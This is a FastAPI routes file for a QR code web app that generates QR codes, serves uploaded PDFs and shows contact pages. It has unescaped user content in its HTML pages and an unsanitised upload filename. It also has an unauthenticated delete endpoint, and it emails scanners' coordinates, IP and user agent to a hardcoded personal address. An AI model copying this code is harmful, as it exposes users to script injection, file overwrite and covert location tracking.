from fastapi import APIRouter, HTTPException, Depends, UploadFile, File, Form, Request, Response
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from typing import Optional, List
from sqlalchemy.orm import Session
from pydantic import BaseModel
from app.models.qr_models import (
    QRCodeRequest, QRCodeResponse, AISuggestionRequest, AISuggestionResponse, QRContentDisplay,
    ContactQRRequest, ContactQRResponse, ContactQRDisplay
)
from app.services.qr_service import QRCodeService
from app.services.ai_service import AIService
from app.services.content_service import ContentService
from app.services.database_service import DatabaseService
from app.core.database import get_db
from app.api.auth import get_current_user
import os
from datetime import datetime

# Model for scan location reporting
class ScanLocationReport(BaseModel):
    qr_id: str
    lat: float
    lng: float
    accuracy: Optional[float] = None

# Create routers
qr_router = APIRouter()
ai_router = APIRouter()
content_router = APIRouter()

# Initialize services
qr_service = QRCodeService()
ai_service = AIService()
content_service = ContentService()
db_service = DatabaseService()

# Pydantic model for content generation request
class ContentGenerationRequest(BaseModel):
    prompt: str
    include_images: bool = False

class PdfLinkQRRequest(BaseModel):
    pdf_path: str
    size: int = 512
    error_correction: str = "M"
    border: int = 4
    foreground_color: str = "#000000"
    background_color: str = "#FFFFFF"
    logo_url: Optional[str] = None

@qr_router.post("/generate", response_model=QRCodeResponse)
async def generate_qr_code(request: QRCodeRequest, db: Session = Depends(get_db), user=Depends(get_current_user)):
    """Generate a QR code with the specified parameters"""
    try:
        # Validate content
        if not request.content.strip():
            raise HTTPException(status_code=400, detail="Content cannot be empty")
        
        # Save QR design to database
        qr_design = db_service.create_qr_design(db, request.dict())
        qr_id = qr_design.id

        # For content type, persist content data alongside design to keep ids aligned
        image_url = None
        if request.qr_type == "content":
            await content_service.save_content(
                content=request.content,
                qr_type=request.qr_type,
                title=request.title,
                description=request.description,
                db=db,
                qr_id=qr_id
            )
            content_data = content_service.get_content(qr_id, db)
            image_url = content_data.image_url if content_data else None
        
        # Generate QR code
        result = qr_service.generate_qr_code(request, qr_id, image_url)
        
        if result["success"]:
            return QRCodeResponse(
                success=True,
                qr_code_data=result["qr_code_data"],
                qr_id=qr_id,
                view_url=result.get("view_url"),
                metadata=result["metadata"]
            )
        else:
            raise HTTPException(status_code=500, detail=result["error"])
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to generate QR code: {str(e)}")

@qr_router.post("/generate-pdf-link", response_model=QRCodeResponse)
async def generate_pdf_link_qr(request: PdfLinkQRRequest, db: Session = Depends(get_db), user=Depends(get_current_user), http_request: Request = None):
    """Create a QR that redirects through a view page to the PDF, capturing geolocation on scan."""
    try:
        if not request.pdf_path or not request.pdf_path.startswith("/uploads/"):
            raise HTTPException(status_code=400, detail="Invalid pdf_path")

        # Create a QR design record
        qr_design = db_service.create_qr_design(db, {
            "content": request.pdf_path,
            "qr_type": "url",
            "size": request.size,
            "error_correction": request.error_correction,
            "border": request.border,
            "foreground_color": request.foreground_color,
            "background_color": request.background_color,
            "logo_url": request.logo_url,
        })
        qr_id = qr_design.id

        # Save mapping to PDF path
        db_service.save_content_data(db, qr_design_id=qr_id, content=request.pdf_path, content_type="pdf_link")

        # Build view URL that captures location then redirects to the PDF (use current host)
        base = str(http_request.base_url).rstrip("/") if http_request else ""
        view_url = f"{base}/api/v1/view/pdf/{qr_id}"

        # Generate QR image pointing to the view URL
        qr_request = QRCodeRequest(
            content=view_url,
            qr_type="url",
            size=request.size,
            error_correction=request.error_correction,  # type: ignore
            border=request.border,
            foreground_color=request.foreground_color,
            background_color=request.background_color,
            logo_url=request.logo_url,
        )
        result = qr_service.generate_qr_code(qr_request, qr_id)

        if result["success"]:
            return QRCodeResponse(
                success=True,
                qr_code_data=result["qr_code_data"],
                qr_id=qr_id,
                view_url=view_url,
                metadata=result.get("metadata")
            )
        else:
            raise HTTPException(status_code=500, detail=result["error"])
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to generate PDF link QR: {str(e)}")

@qr_router.post("/generate-with-image", response_model=QRCodeResponse)
async def generate_qr_code_with_image(
    content: str = Form(...),
    qr_type: str = Form("content"),
    title: Optional[str] = Form(None),
    description: Optional[str] = Form(None),
    image_file: UploadFile = File(None),
    db: Session = Depends(get_db),
    user=Depends(get_current_user)
):
    """Generate a QR code with image upload"""
    try:
        # Validate content
        if not content.strip() and not image_file:
            raise HTTPException(status_code=400, detail="Content or image is required")
        
        # Create QR request
        qr_request = QRCodeRequest(
            content=content,
            qr_type=qr_type,
            title=title,
            description=description
        )
        
        # Save QR design to database
        qr_design = db_service.create_qr_design(db, qr_request)
        qr_id = qr_design.id
        
        # Save content with image
        await content_service.save_content(
            content=content,
            qr_type=qr_type,
            title=title,
            description=description,
            image_file=image_file,
            db=db
        )
        
        # Get the content data to find image URL
        content_data = content_service.get_content(qr_id, db)
        image_url = content_data.image_url if content_data else None
        
        # Generate QR code
        result = qr_service.generate_qr_code(qr_request, qr_id, image_url)
        
        if result["success"]:
            return QRCodeResponse(
                success=True,
                qr_code_data=result["qr_code_data"],
                qr_id=qr_id,
                view_url=result.get("view_url"),
                metadata=result["metadata"]
            )
        else:
            raise HTTPException(status_code=500, detail=result["error"])
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to generate QR code: {str(e)}")

@qr_router.get("/types")
async def get_qr_types():
    """Get available QR code types"""
    return {
        "types": [
            {"value": "url", "label": "URL", "description": "Website links"},
            {"value": "text", "label": "Text", "description": "Plain text content"},
            {"value": "contact", "label": "Contact", "description": "Contact information (vCard)"},
            {"value": "wifi", "label": "WiFi", "description": "WiFi network credentials"},
            {"value": "email", "label": "Email", "description": "Email address"},
            {"value": "phone", "label": "Phone", "description": "Phone number"},
            {"value": "sms", "label": "SMS", "description": "Text message"}
        ]
    }

@qr_router.get("/error-correction-levels")
async def get_error_correction_levels():
    """Get available error correction levels"""
    return {
        "levels": [
            {"value": "L", "label": "Low (7%)", "description": "Lowest error correction"},
            {"value": "M", "label": "Medium (15%)", "description": "Default level"},
            {"value": "Q", "label": "Quartile (25%)", "description": "Higher error correction"},
            {"value": "H", "label": "High (30%)", "description": "Highest error correction"}
        ]
    }

@qr_router.post("/validate-url")
async def validate_url(url: str):
    """Validate URL format"""
    is_valid = qr_service.validate_url(url)
    return {
        "url": url,
        "is_valid": is_valid,
        "suggestions": [] if is_valid else ["Add https:// protocol", "Check URL format"]
    }

@ai_router.post("/suggestions", response_model=AISuggestionResponse)
async def get_ai_suggestions(request: AISuggestionRequest):
    """Get AI-powered suggestions for QR code content"""
    try:
        if not request.content.strip():
            raise HTTPException(status_code=400, detail="Content cannot be empty")
        
        result = await ai_service.get_suggestions(
            request.content, 
            request.qr_type, 
            request.context
        )
        
        return AISuggestionResponse(
            suggestions=result["suggestions"],
            optimized_content=result["optimized_content"],
            confidence_score=result["confidence_score"]
        )
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to get AI suggestions: {str(e)}")

@ai_router.post("/analyze")
async def analyze_content(content: str, qr_type: str):
    """Analyze QR code content for potential issues"""
    try:
        analysis = await ai_service.analyze_content(content, qr_type)
        return analysis
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Analysis failed: {str(e)}")

@ai_router.post("/generate-content")
async def generate_content(request: ContentGenerationRequest):
    """Generate content based on user prompt with strict limits"""
    try:
        # Validate prompt length
        if len(request.prompt) > 2000:
            raise HTTPException(status_code=400, detail="Prompt exceeds 2000 character limit")
        
        if not request.prompt.strip():
            raise HTTPException(status_code=400, detail="Prompt cannot be empty")
        
        # Generate content
        result = await ai_service.generate_content_from_prompt(request.prompt, request.include_images)
        
        if "error" in result:
            raise HTTPException(status_code=500, detail=result["error"])
        
        return {
            "success": True,
            "content": result["content"],
            "images": result["images"],
            "token_count": result["token_count"],
            "prompt_length": result["prompt_length"]
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Content generation failed: {str(e)}")

@ai_router.get("/health")
async def ai_health_check():
    """Check AI service health"""
    return {
        "status": "healthy",
        "ai_available": True,
        "service": "QuickQR AI Service (DeepSeek)",
        "provider": "DeepSeek (Free)"
    }

# Content viewing endpoints
@content_router.get("/view/{qr_id}")
async def view_content(qr_id: str, db: Session = Depends(get_db), request: Request = None):
    """View content by QR ID"""
    # Record usage for analytics
    if request:
        db_service.record_qr_usage(
            db=db,
            qr_design_id=qr_id,
            ip_address=request.client.host if request.client else None,
            user_agent=request.headers.get("user-agent"),
            referrer=request.headers.get("referer")
        )
    
    content = content_service.get_content(qr_id, db)
    if not content:
        raise HTTPException(status_code=404, detail="Content not found")
    
    return HTMLResponse(content=f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{content.title or 'QR Content'}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .content {{ max-width: 600px; margin: 0 auto; }}
            img {{ max-width: 100%; height: auto; }}
        </style>
    </head>
    <body>
        <div class="content">
            {f'<h1>{content.title}</h1>' if content.title else ''}
            {f'<p>{content.description}</p>' if content.description else ''}
            {f'<img src="{content.image_url}" alt="Content Image">' if content.image_url else ''}
            <div>{content.content}</div>
        </div>
    </body>
    </html>
    """)

@content_router.post("/upload-pdf")
async def upload_pdf(file: UploadFile = File(...)):
    """Upload a PDF to the uploads directory and return its public path"""
    try:
        if not file:
            raise HTTPException(status_code=400, detail="File is required")
        if file.content_type not in ("application/pdf",):
            raise HTTPException(status_code=400, detail="Only PDF files are allowed")

        os.makedirs("uploads", exist_ok=True)
        timestamp = datetime.utcnow().strftime("%Y%m%d%H%M%S")
        safe_name = file.filename or "document.pdf"
        base, ext = os.path.splitext(safe_name)
        if ext.lower() != ".pdf":
            ext = ".pdf"
        filename = f"{base}_{timestamp}.pdf"
        filepath = os.path.join("uploads", filename)

        data = await file.read()
        with open(filepath, "wb") as f:
            f.write(data)

        return {"path": f"/uploads/{filename}"}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to upload PDF: {str(e)}")

@content_router.get("/pdf/{filename}")
async def serve_pdf(filename: str, request: Request):
    """Serve PDF files with proper headers"""
    try:
        # Security: prevent directory traversal
        if ".." in filename or "/" in filename:
            raise HTTPException(status_code=400, detail="Invalid filename")
        
        file_path = os.path.join("uploads", filename)
        if not os.path.exists(file_path):
            raise HTTPException(status_code=404, detail="PDF not found")
        
        # Read file and return with proper headers
        with open(file_path, "rb") as f:
            content = f.read()
        
        return Response(
            content=content,
            media_type="application/pdf",
            headers={
                "Content-Disposition": f"inline; filename={filename}",
                "Cache-Control": "public, max-age=3600"
            }
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to serve PDF: {str(e)}")

@content_router.get("/view/pdf/{qr_id}")
async def view_pdf_with_geo(qr_id: str, request: Request, db: Session = Depends(get_db)):
    """Intermediate HTML view that captures geolocation then redirects to the actual PDF."""
    # Fetch mapping
    content = db_service.get_content_data(db, qr_id)
    if not content or content.content_type != "pdf_link" or not content.text_content:
        raise HTTPException(status_code=404, detail="PDF mapping not found")

    pdf_path = content.text_content
    backend_base = "https://quickqr-backend.onrender.com"
    pdf_url = f"{backend_base}{pdf_path}"

    # Record basic usage first
    db_service.record_qr_usage(
        db=db,
        qr_design_id=qr_id,
        ip_address=request.client.host if request.client else None,
        user_agent=request.headers.get("user-agent"),
        referrer=request.headers.get("referer")
    )

    # Render page that posts geolocation then redirects to PDF
    return HTMLResponse(content=f"""
    <!doctype html>
    <html>
    <head>
      <meta charset='utf-8'>
      <meta name='viewport' content='width=device-width, initial-scale=1'>
      <title>Opening PDF…</title>
      <style>
        body {{ font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; background:#f8fafc; }}
        .card {{ background:#fff; border:1px solid #e5e7eb; border-radius:12px; padding:24px; width:92%; max-width:420px; box-shadow:0 8px 24px rgba(0,0,0,0.08); text-align:center; }}
        .muted {{ color:#6b7280; font-size:14px; margin-top:8px; }}
      </style>
    </head>
    <body>
      <div class='card'>
        <div>Preparing your document…</div>
        <div class='muted'>We may ask for location to help the owner recover lost items.</div>
      </div>
      <script>
        (function() {{
          var sent = false;
          function go() {{ if (!sent) window.location.replace('{pdf_url}'); }}
          try {{
            if (!navigator.geolocation) return go();
            navigator.geolocation.getCurrentPosition(function(p) {{
              sent = true;
              var base = window.location.origin;
              fetch(base + '/api/v1/scan/location', {{
                method: 'POST', headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ qr_id: '{qr_id}', lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy }})
              }}).finally(go);
            }}, function() {{ go(); }}, {{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }});
          }} catch(e) {{ go(); }}
          setTimeout(go, 5000);
        }})();
      </script>
    </body>
    </html>
    """)

@content_router.get("/content/{qr_id}")
async def get_content_data(qr_id: str, db: Session = Depends(get_db)):
    """Get content data by QR ID (API endpoint)"""
    content = content_service.get_content(qr_id, db)
    if not content:
        raise HTTPException(status_code=404, detail="Content not found")
    
    return content

@content_router.delete("/content/{qr_id}")
async def delete_content(qr_id: str, db: Session = Depends(get_db)):
    """Delete content by QR ID"""
    success = content_service.delete_content(qr_id, db)
    if not success:
        raise HTTPException(status_code=404, detail="Content not found")
    
    return {"success": True, "message": "Content deleted successfully"}

# QR Design Management endpoints
@qr_router.get("/designs", response_model=List[dict])
async def get_all_designs(
    limit: int = 100, 
    offset: int = 0, 
    db: Session = Depends(get_db),
    user=Depends(get_current_user)
):
    """Get all QR designs with pagination"""
    designs = db_service.get_all_qr_designs(db, limit=limit, offset=offset)
    return [
        {
            "id": design.id,
            "title": design.title,
            "description": design.description,
            "qr_type": design.qr_type,
            "created_at": design.created_at,
            "updated_at": design.updated_at
        }
        for design in designs
    ]

@qr_router.get("/designs/{design_id}")
async def get_design(design_id: str, db: Session = Depends(get_db), user=Depends(get_current_user)):
    """Get a specific QR design by ID"""
    design = db_service.get_qr_design(db, design_id)
    if not design:
        raise HTTPException(status_code=404, detail="Design not found")
    
    return {
        "id": design.id,
        "title": design.title,
        "description": design.description,
        "content": design.content,
        "qr_type": design.qr_type,
        "size": design.size,
        "error_correction": design.error_correction,
        "border": design.border,
        "foreground_color": design.foreground_color,
        "background_color": design.background_color,
        "logo_url": design.logo_url,
        "created_at": design.created_at,
        "updated_at": design.updated_at
    }

@qr_router.put("/designs/{design_id}")
async def update_design(
    design_id: str, 
    update_data: dict, 
    db: Session = Depends(get_db),
    user=Depends(get_current_user)
):
    """Update a QR design"""
    design = db_service.update_qr_design(db, design_id, update_data)
    if not design:
        raise HTTPException(status_code=404, detail="Design not found")
    
    return {"success": True, "message": "Design updated successfully"}

@qr_router.delete("/designs/{design_id}")
async def delete_design(design_id: str, db: Session = Depends(get_db), user=Depends(get_current_user)):
    """Delete a QR design"""
    success = db_service.delete_qr_design(db, design_id)
    if not success:
        raise HTTPException(status_code=404, detail="Design not found")
    
    return {"success": True, "message": "Design deleted successfully"}

@qr_router.get("/designs/{design_id}/usage")
async def get_design_usage(design_id: str, db: Session = Depends(get_db), user=Depends(get_current_user)):
    """Get usage statistics for a QR design"""
    # Check if design exists
    design = db_service.get_qr_design(db, design_id)
    if not design:
        raise HTTPException(status_code=404, detail="Design not found")
    
    usage_stats = db_service.get_qr_usage_stats(db, design_id)
    return usage_stats

@qr_router.get("/designs/search/{query}")
async def search_designs(
    query: str, 
    limit: int = 50, 
    db: Session = Depends(get_db),
    user=Depends(get_current_user)
):
    """Search QR designs by title, description, or content"""
    designs = db_service.search_qr_designs(db, query, limit=limit)
    return [
        {
            "id": design.id,
            "title": design.title,
            "description": design.description,
            "qr_type": design.qr_type,
            "created_at": design.created_at
        }
        for design in designs
    ] 

@qr_router.post("/generate-contact", response_model=ContactQRResponse)
async def generate_contact_qr_code(request: ContactQRRequest, db: Session = Depends(get_db), user=Depends(get_current_user), http_request: Request = None):
    """Generate a Contact QR that opens a hosted view (captures geolocation) with a fancy template."""
    try:
        # Validate required fields
        if not request.full_name.value.strip():
            raise HTTPException(status_code=400, detail="Full name is required")
        if not request.phone_number.value.strip():
            raise HTTPException(status_code=400, detail="Phone number is required")
        if not request.address.value.strip():
            raise HTTPException(status_code=400, detail="Address is required")

        # Save QR design to database
        qr_design = db_service.create_qr_design(db, {
            "content": f"Contact QR: {request.full_name.value}",
            "qr_type": "contact_qr",
            "size": request.size,
            "error_correction": request.error_correction,
            "border": request.border,
            "foreground_color": request.foreground_color,
            "background_color": request.background_color,
            "logo_url": request.logo_url
        })
        qr_id = qr_design.id

        # Save contact data to database
        contact_data = ContactQRDisplay(
            qr_id=qr_id,
            full_name=request.full_name.value if request.full_name.show else None,
            phone_number=request.phone_number.value if request.phone_number.show else None,
            address=request.address.value if request.address.show else None,
            email=request.email.value if request.email and request.email.show else None,
            company=request.company.value if request.company and request.company.show else None,
            website=request.website.value if request.website and request.website.show else None,
            send_location_on_scan=request.send_location_on_scan,
            created_at=datetime.utcnow(),
            qr_type="contact_qr"
        )

        db_service.save_contact_qr_data(db, contact_data)

        # Build hosted view URL and generate URL QR (not vCard) so we can capture location on scan
        base = str(http_request.base_url).rstrip("/") if http_request else ""
        view_url = f"{base}/api/v1/contact-view/{qr_id}"

        qr_request = QRCodeRequest(
            content=view_url,
            qr_type="url",
            size=request.size,
            error_correction=request.error_correction,  # type: ignore
            border=request.border,
            foreground_color=request.foreground_color,
            background_color=request.background_color,
            logo_url=request.logo_url,
        )
        result = qr_service.generate_qr_code(qr_request, qr_id)

        if result["success"]:
            return ContactQRResponse(
                success=True,
                qr_code_data=result["qr_code_data"],
                qr_id=qr_id,
                view_url=view_url,
                metadata=result.get("metadata")
            )
        else:
            raise HTTPException(status_code=500, detail=result["error"])

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to generate Contact QR code: {str(e)}")

@content_router.get("/contact-view/{qr_id}")
async def view_contact_qr(qr_id: str, db: Session = Depends(get_db), request: Request = None):
    """View Contact QR content by QR ID"""
    # Record usage for analytics
    if request:
        db_service.record_qr_usage(
            db=db,
            qr_design_id=qr_id,
            ip_address=request.client.host if request.client else None,
            user_agent=request.headers.get("user-agent"),
            referrer=request.headers.get("referer")
        )
    
    # Get contact data from database
    contact_data = db_service.get_contact_qr_data(db, qr_id)
    if not contact_data:
        raise HTTPException(status_code=404, detail="Contact QR not found")
    
    # Build HTML content showing only the flagged information
    contact_fields = []
    if contact_data.full_name:
        contact_fields.append(f'<div class="contact-field"><strong>Name:</strong> {contact_data.full_name}</div>')
    if contact_data.phone_number:
        contact_fields.append(f'<div class="contact-field"><strong>Phone:</strong> <a href="tel:{contact_data.phone_number}">{contact_data.phone_number}</a></div>')
    if contact_data.address:
        contact_fields.append(f'<div class="contact-field"><strong>Address:</strong> {contact_data.address}</div>')
    if contact_data.email:
        contact_fields.append(f'<div class="contact-field"><strong>Email:</strong> <a href="mailto:{contact_data.email}">{contact_data.email}</a></div>')
    if contact_data.company:
        contact_fields.append(f'<div class="contact-field"><strong>Company:</strong> {contact_data.company}</div>')
    if contact_data.website:
        contact_fields.append(f'<div class="contact-field"><strong>Website:</strong> <a href="{contact_data.website}" target="_blank">{contact_data.website}</a></div>')
    
    contact_html = "\n".join(contact_fields)

    # Geolocation capture script (runs only if enabled via stored data)
    geo_script = ""
    if getattr(contact_data, 'send_location_on_scan', True):
        geo_script = f"""
        <script>
        (function() {{
          try {{
            var key = 'quickqr_geo_{qr_id}';
            if (localStorage.getItem(key)) return;
            if (!navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(function(p) {{
              var base = window.location.origin;
              fetch(base + '/api/v1/scan/location', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ qr_id: '{qr_id}', lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy }})
              }}).then(function() {{ localStorage.setItem(key, '1'); }}).catch(function() {{}});
            }}, function(err) {{}}, {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }});
          }} catch (e) {{}}
        }})();
        </script>
        """

    return HTMLResponse(content=f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Contact Information</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                margin: 0; 
                padding: 20px; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }}
            .contact-card {{ 
                background: white; 
                border-radius: 20px; 
                padding: 40px; 
                box-shadow: 0 20px 40px rgba(0,0,0,0.1);
                max-width: 500px; 
                width: 100%;
                text-align: center;
            }}
            .contact-header {{
                margin-bottom: 30px;
                color: #333;
            }}
            .contact-header h1 {{
                margin: 0 0 10px 0;
                font-size: 28px;
                font-weight: 600;
                color: #2d3748;
            }}
            .contact-header p {{
                margin: 0;
                color: #718096;
                font-size: 16px;
            }}
            .contact-fields {{
                text-align: left;
            }}
            .contact-field {{
                padding: 15px 0;
                border-bottom: 1px solid #e2e8f0;
                font-size: 16px;
                color: #4a5568;
            }}
            .contact-field:last-child {{
                border-bottom: none;
            }}
            .contact-field strong {{
                color: #2d3748;
                display: inline-block;
                width: 80px;
                margin-right: 15px;
            }}
            .contact-field a {{
                color: #3182ce;
                text-decoration: none;
            }}
            .contact-field a:hover {{
                text-decoration: underline;
            }}
            .qr-info {{
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #e2e8f0;
                font-size: 14px;
                color: #718096;
            }}
        </style>
    </head>
    <body>
        <div class="contact-card">
            <div class="contact-header">
                <h1>Contact Information</h1>
                <p>Scanned from QR Code</p>
            </div>
            <div class="contact-fields">
                {contact_html}
            </div>
            <div class="qr-info">
                Generated by QuickQR • {contact_data.created_at.strftime('%B %d, %Y')}
            </div>
        </div>
        {geo_script}
    </body>
    </html>
    """)

@content_router.get("/contact-data/{qr_id}")
async def get_contact_qr_data(qr_id: str, db: Session = Depends(get_db)):
    """Get Contact QR data by QR ID (API endpoint)"""
    contact_data = db_service.get_contact_qr_data(db, qr_id)
    if not contact_data:
        raise HTTPException(status_code=404, detail="Contact QR not found")
    
    return contact_data 

@content_router.post("/scan/location")
async def report_scan_location(payload: ScanLocationReport, request: Request, db: Session = Depends(get_db)):
    """Receive scanner device geolocation for a QR and optionally notify via SMS if contact data exists."""
    try:
        contact = db_service.get_contact_qr_data(db, payload.qr_id)

        # Store usage entry with location string always
        loc = f"{payload.lat},{payload.lng}"
        if payload.accuracy is not None:
            loc += f" (±{int(payload.accuracy)}m)"
        db_service.record_qr_usage(
            db=db,
            qr_design_id=payload.qr_id,
            ip_address=request.client.host if request.client else None,
            user_agent=request.headers.get("user-agent"),
            referrer=request.headers.get("referer"),
            location=loc
        )

        # If contact data exists and notifications are enabled, send SMS and/or email
        sms_sent = False
        sms_error = None
        email_sent = False
        email_error = None

        if contact and getattr(contact, 'send_location_on_scan', True):
            maps = f"https://maps.google.com/?q={payload.lat},{payload.lng}"
            # SMS via Twilio
            if contact.phone_number:
                try:
                    from twilio.rest import Client  # type: ignore
                    sid = os.getenv("TWILIO_ACCOUNT_SID")
                    token = os.getenv("TWILIO_AUTH_TOKEN")
                    from_num = os.getenv("TWILIO_FROM_NUMBER")
                    if not (sid and token and from_num):
                        sms_error = "twilio_env_missing"
                    else:
                        client = Client(sid, token)
                        msg = client.messages.create(
                            body=f"QuickQR: Your QR was scanned. Location: {maps}",
                            from_=from_num,
                            to=contact.phone_number
                        )
                        sms_sent = True if msg.sid else False
                except Exception as e:
                    sms_error = str(e)

            # Email via SMTP (optional fallback)
            if contact.email:
                try:
                    import smtplib
                    from email.mime.text import MIMEText

                    smtp_host = os.getenv("SMTP_HOST")
                    smtp_port = int(os.getenv("SMTP_PORT") or 587)
                    smtp_user = os.getenv("SMTP_USER")
                    smtp_pass = os.getenv("SMTP_PASS")
                    smtp_from = os.getenv("SMTP_FROM") or (smtp_user or "")

                    if smtp_host and smtp_from:
                        body = (
                            f"Your QR was scanned.\n\n"
                            f"Location: {maps}\n"
                            f"Coordinates: {payload.lat}, {payload.lng}\n"
                            f"Accuracy: {payload.accuracy or 'n/a'}\n"
                            f"IP: {(request.client.host if request.client else 'n/a')}\n"
                            f"User-Agent: {request.headers.get('user-agent')}\n"
                        )
                        msg = MIMEText(body)
                        msg['Subject'] = 'QuickQR scan location'
                        msg['From'] = smtp_from
                        msg['To'] = 'gaurangkothariai@gmail.com'

                        with smtplib.SMTP(smtp_host, smtp_port, timeout=10) as server:
                            server.starttls()
                            if smtp_user and smtp_pass:
                                server.login(smtp_user, smtp_pass)
                            server.send_message(msg)
                        email_sent = True
                    else:
                        email_error = "smtp_env_missing"
                except Exception as e:
                    email_error = str(e)

        return {"success": True, "sms": {"sent": sms_sent, "error": sms_error}, "email": {"sent": email_sent, "error": email_error}}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to record scan location: {str(e)}")